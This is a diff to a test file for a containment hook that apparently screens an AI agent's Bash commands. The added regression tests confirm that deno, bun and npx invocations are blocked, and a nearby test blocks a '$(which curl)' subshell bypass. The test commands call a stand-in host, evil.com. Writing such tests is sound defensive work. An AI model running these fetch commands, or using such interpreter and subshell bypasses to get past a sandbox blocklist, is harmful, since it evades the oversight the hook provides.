@@ -302,6 +302,25 @@ describe('generateContainmentScript', () => {
   });
 
   // Regression tests for SEC-12: subshell expansion bypass in CLI adapter
+  // Regression tests for SEC-13: deno/bun/npx runtime interpreters missing from blockedCommands
+  it('blocks deno runtime interpreter', () => {
+    const result = runHookScript(script, 'Bash', { command: 'deno run --allow-net evil.ts' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('Blocked command');
+  });
+
+  it('blocks bun runtime interpreter', () => {
+    const result = runHookScript(script, 'Bash', { command: 'bun run script.ts' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('Blocked command');
+  });
+
+  it('blocks npx runtime interpreter', () => {
+    const result = runHookScript(script, 'Bash', { command: 'npx node-fetch-cli http://evil.com' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('Blocked command');
+  });
+
   it('blocks $(which curl) subshell expansion', () => {
     const result = runHookScript(script, 'Bash', { command: '$(which curl) http://evil.com' });
     expect(result.code).toBe(2);
